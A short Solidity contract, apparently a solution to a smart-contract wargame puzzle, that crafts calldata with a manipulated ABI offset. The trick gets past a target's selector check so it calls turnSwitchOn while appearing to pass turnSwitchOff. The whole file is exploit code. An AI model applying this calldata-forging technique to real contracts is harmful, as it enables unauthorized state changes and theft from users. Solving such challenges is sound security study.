// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SwitchHack {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function hack() external {
        bytes memory data = abi.encodeWithSignature(
            "flipSwitch(bytes)",
            bytes32(uint256(96)),
            bytes32(""),
            bytes4(keccak256("turnSwitchOff()")),
            bytes32(uint256(4)),
            bytes4(keccak256("turnSwitchOn()"))
        );
        target.call(data);
    }
}
